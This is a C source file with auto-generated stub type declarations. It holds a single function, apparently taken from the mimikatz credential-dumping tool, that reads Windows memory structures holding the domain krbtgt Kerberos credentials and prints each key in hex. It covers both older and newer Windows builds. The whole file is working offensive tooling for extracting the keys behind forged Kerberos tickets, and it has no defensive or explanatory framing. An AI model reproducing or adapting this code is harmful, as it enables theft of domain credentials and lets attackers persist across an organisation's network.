#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_13__   TYPE_2__ ;
typedef  struct TYPE_12__   TYPE_1__ ;

/* Type definitions */
typedef  int /*<<< orphan*/  ULONG_PTR ;
struct TYPE_13__ {int cbCred; TYPE_1__* credentials; } ;
struct TYPE_12__ {int /*<<< orphan*/  size; scalar_t__ key; int /*<<< orphan*/  type; } ;
typedef  TYPE_2__* PVOID ;
typedef  TYPE_2__* PKIWI_KRBTGT_CREDENTIALS_64 ;
typedef  TYPE_2__* PKIWI_KRBTGT_CREDENTIALS_6 ;
typedef  int /*<<< orphan*/  LPCSTR ;
typedef  int /*<<< orphan*/  KIWI_KRBTGT_CREDENTIAL_64 ;
typedef  int /*<<< orphan*/  KIWI_KRBTGT_CREDENTIAL_6 ;
typedef  TYPE_2__ KIWI_KRBTGT_CREDENTIALS_64 ;
typedef  TYPE_2__ KIWI_KRBTGT_CREDENTIALS_6 ;
typedef  size_t DWORD ;

/* Variables and functions */
 scalar_t__ KULL_M_WIN_BUILD_10_1607 ; 
 int /*<<< orphan*/  LPTR ; 
 TYPE_2__* LocalAlloc (int /*<<< orphan*/ ,size_t) ; 
 int /*<<< orphan*/  LocalFree (TYPE_2__*) ; 
 scalar_t__ NtBuildNumber ; 
 int /*<<< orphan*/  PtrToLong (int /*<<< orphan*/ ) ; 
 size_t PtrToUlong (int /*<<< orphan*/ ) ; 
 scalar_t__ ReadMemory (int /*<<< orphan*/ ,TYPE_2__*,size_t,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  dprintf (char*,...) ; 
 int /*<<< orphan*/  kuhl_m_kerberos_ticket_etype (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  kull_m_string_dprintf_hex (TYPE_2__*,size_t,int /*<<< orphan*/ ) ; 

void kuhl_m_sekurlsa_krbtgt_keys(PVOID addr, LPCSTR prefix)
{
	DWORD sizeForCreds, i;
	KIWI_KRBTGT_CREDENTIALS_64 tmpCred64, *creds64;
	KIWI_KRBTGT_CREDENTIALS_6 tmpCred6, *creds6;
	PVOID buffer;

	if(addr)
	{
		dprintf("\n%s krbtgt: ", prefix);
		if(NtBuildNumber < KULL_M_WIN_BUILD_10_1607)
		{
			if(ReadMemory((ULONG_PTR) addr, &tmpCred6, sizeof(KIWI_KRBTGT_CREDENTIALS_6) - sizeof(KIWI_KRBTGT_CREDENTIAL_6), NULL))
			{
				sizeForCreds = sizeof(KIWI_KRBTGT_CREDENTIALS_6) + (tmpCred6.cbCred - 1) * sizeof(KIWI_KRBTGT_CREDENTIAL_6);
				if(creds6 = (PKIWI_KRBTGT_CREDENTIALS_6) LocalAlloc(LPTR, sizeForCreds))
				{
					if(ReadMemory((ULONG_PTR) addr, creds6, sizeForCreds, NULL))
					{
						dprintf("%u credentials\n", creds6->cbCred);
						for(i = 0; i < creds6->cbCred; i++)
						{
							dprintf("\t * %s : ", kuhl_m_kerberos_ticket_etype(PtrToLong(creds6->credentials[i].type)));
							if(buffer = LocalAlloc(LPTR, PtrToUlong(creds6->credentials[i].size)))
							{
								if(ReadMemory((ULONG_PTR) creds6->credentials[i].key, buffer, PtrToUlong(creds6->credentials[i].size), NULL))
									kull_m_string_dprintf_hex(buffer, PtrToUlong(creds6->credentials[i].size), 0);
								LocalFree(buffer);
							}
							dprintf("\n");
						}
					}
					LocalFree(creds6);
				}
			}
		}
		else
		{
			if(ReadMemory((ULONG_PTR) addr, &tmpCred64, sizeof(KIWI_KRBTGT_CREDENTIALS_64) - sizeof(KIWI_KRBTGT_CREDENTIAL_64), NULL))
			{
				sizeForCreds = sizeof(KIWI_KRBTGT_CREDENTIALS_64) + (tmpCred64.cbCred - 1) * sizeof(KIWI_KRBTGT_CREDENTIAL_64);
				if(creds64 = (PKIWI_KRBTGT_CREDENTIALS_64) LocalAlloc(LPTR, sizeForCreds))
				{
					if(ReadMemory((ULONG_PTR) addr, creds64, sizeForCreds, NULL))
					{
						dprintf("%u credentials\n", creds64->cbCred);
						for(i = 0; i < creds64->cbCred; i++)
						{
							dprintf("\t * %s : ", kuhl_m_kerberos_ticket_etype(PtrToLong(creds64->credentials[i].type)));
							if(buffer = LocalAlloc(LPTR, PtrToUlong(creds64->credentials[i].size)))
							{
								if(ReadMemory((ULONG_PTR) creds64->credentials[i].key, buffer, PtrToUlong(creds64->credentials[i].size), NULL))
									kull_m_string_dprintf_hex(buffer, PtrToUlong(creds64->credentials[i].size), 0);
								LocalFree(buffer);
							}
							dprintf("\n");
						}
					}
					LocalFree(creds64);
				}
			}
		}
	}
}